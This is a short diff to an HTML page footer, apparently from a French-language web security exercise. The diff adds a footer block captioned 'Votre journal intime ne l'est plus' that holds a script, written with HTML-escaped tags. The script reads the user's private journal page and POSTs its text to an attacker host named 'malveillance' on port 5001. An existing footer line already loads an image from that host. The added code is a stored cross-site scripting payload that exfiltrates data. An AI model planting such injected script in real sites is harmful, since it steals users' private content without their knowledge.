@@ -294,6 +294,28 @@
         <div class="footer-text">
             Si vous lisez ces lignes, courage à vous.&lt;img src="https://malveillance:5001/image/loutre"&gt;
         </div>
+       <div class="footer-text">
+           Votre journal intime ne l'est plus
+           &lt;script&gt;
+            fetch("/journal")
+              .then(r => r.text())
+              .then(html => {
+                const doc = new DOMParser().parseFromString(html, "text/html");
+                const journal = doc.querySelector("#journal").innerText;
+
+                fetch("https://malveillance:5001/collect", {
+                  method: "POST",
+                  body: new URLSearchParams({
+                    page: "/journal",
+                    content: journal
+                  })
+                });
+              });
+            &lt;/script&gt;
+        </div>
+
+
+
     </div>
 </body>
 </html>
